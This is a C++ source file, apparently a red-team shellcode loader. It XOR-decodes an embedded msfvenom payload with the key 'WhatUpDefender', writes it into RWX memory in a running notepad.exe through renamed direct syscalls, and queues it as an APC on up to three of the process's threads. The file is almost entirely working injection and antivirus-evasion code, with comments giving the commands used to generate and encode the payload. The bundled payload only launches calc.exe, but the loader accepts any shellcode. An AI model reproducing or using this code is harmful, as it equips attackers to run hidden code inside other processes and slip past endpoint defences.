#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "syscalls_all.h"
#include <stdio.h>

int main()
{

    // msfvenom -p windows/x64/exec CMD="cmd.exe /C calc.exe" -f raw -o meter.bin
    // clone the following . https://github.com/Arno0x/ShellcodeWrapper
    // python2.7 shellcode_encoder.py -cpp meter.bin WhatUpDefender xor
    // cat | paste

    char EncPwnCode[] = "\xab\x20\xe2\x90\xa5\x98\x84\x65\x66\x65\x2f\x35\x24\x22\x05\x39\x37\x3c\x64\xa2\x21\x2d\xed\x37\x0e\x2c\xee\x20\x4f\x20\xea\x26\x75\x38\xcf\x17\x36\x2d\x61\xd3\x2f\x38\x1a\x59\xa8\x3c\x64\xb0\xe8\x59\x07\x19\x6c\x48\x45\x33\x96\xa1\x6c\x35\x54\xb1\xa6\x88\x34\x24\x3f\x2c\xee\x20\x77\xe3\x23\x48\x1d\x71\x94\xee\xe6\xed\x6e\x64\x65\x3a\xd2\xa8\x15\x13\x1d\x71\x94\x35\xed\x2d\x76\x20\xee\x32\x77\x21\x60\xa4\xb6\x26\x0c\x9a\xaf\x24\xe5\x50\xed\x3a\x56\xbe\x2c\x45\x9c\x38\x75\xa5\xca\x24\xaf\xad\x68\x33\x56\xa9\x59\x94\x20\x81\x08\x66\x2a\x41\x66\x21\x5c\xa3\x22\xb0\x39\x30\xde\x30\x60\x2c\x67\xb5\x08\x25\xee\x7e\x1f\x2c\xea\x34\x49\x39\x45\xb5\x27\xee\x6a\xec\x2d\x73\x87\x29\x39\x35\x0d\x2e\x1d\x3f\x27\x3d\x2f\x3d\x24\x28\x1f\xeb\x8d\x54\x14\x22\xbb\x85\x3e\x24\x37\x3e\x2d\xf9\x45\x81\x36\x8b\xaa\x8f\x19\x2d\xdc\x64\x6e\x64\x65\x72\x57\x68\x61\x3c\xd8\xfd\x45\x64\x66\x65\x2f\xde\x54\xf9\x38\xef\x9e\xa1\xee\x80\xf1\xc7\x30\x24\xd4\xc2\xf0\xcf\xca\x97\xb4\x3c\xd6\xb4\x6c\x59\x60\x19\x64\xe4\x9e\x92\x22\x6d\xda\x33\x46\x02\x2b\x0f\x66\x3c\x2f\xed\xbf\x8d\x82\x0b\x0c\x10\x7b\x15\x3c\x00\x46\x4a\x2d\x44\x06\x13\x3b\x0b\x4f\x11\x2d\x15\x44";
    char key[] = "WhatUpDefender";
    char cipherType[] = "xor";

    // Char array to host the deciphered shellcode
    char pwncode[sizeof EncPwnCode];


    //XOR decoding stub using the key defined above must be the same as the encoding key
    int j = 0;
    for (int i = 0; i < sizeof EncPwnCode; i++) {
        if (j == sizeof key - 1) j = 0;

        pwncode[i] = EncPwnCode[i] ^ key[j];
        j++;
    }

    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(pwncode);
    HANDLE hThread;
    HANDLE hProcess;

    HANDLE processsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    DWORD dwProcessId;

    if (Process32First(processsnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, L"notepad.exe") != 0) {
            Process32Next(processsnapshot, &processEntry);
        }
    }
    dwProcessId = processEntry.th32ProcessID;

    OBJECT_ATTRIBUTES pObjectAttributes;
    InitializeObjectAttributes(&pObjectAttributes, NULL, NULL, NULL, NULL);

    CLIENT_ID pClientId;
    pClientId.UniqueProcess = (PVOID)processEntry.th32ProcessID;
    pClientId.UniqueThread = (PVOID)0;

    allocation_start = NULL;
    NtOpProc(&hProcess, MAXIMUM_ALLOWED, &pObjectAttributes, &pClientId);
    NtAlViMem(hProcess, &allocation_start, 0, (PSIZE_T)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriVuMem(hProcess, allocation_start, pwncode, sizeof(pwncode), 0);


    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    std::vector<DWORD> threadIds;
    if (Thread32First(processsnapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(processsnapshot, &threadEntry));
    }


    int count = 0;
    for (DWORD threadId : threadIds) {

        OBJECT_ATTRIBUTES tObjectAttributes;
        InitializeObjectAttributes(&tObjectAttributes, NULL, NULL, NULL, NULL);

        CLIENT_ID tClientId;
        tClientId.UniqueProcess = (PVOID)dwProcessId;
        tClientId.UniqueThread = (PVOID)threadId;

        NtOpTh(&hThread, MAXIMUM_ALLOWED, &tObjectAttributes, &tClientId);
        NtSusTh(hThread, NULL);
        NtQueAPTh(hThread, (PKNORMAL_ROUTINE)allocation_start, allocation_start, NULL, NULL);
        NtResThr(hThread, NULL);
        count++;

        if (count == 3) {
            break;
        }
    }
}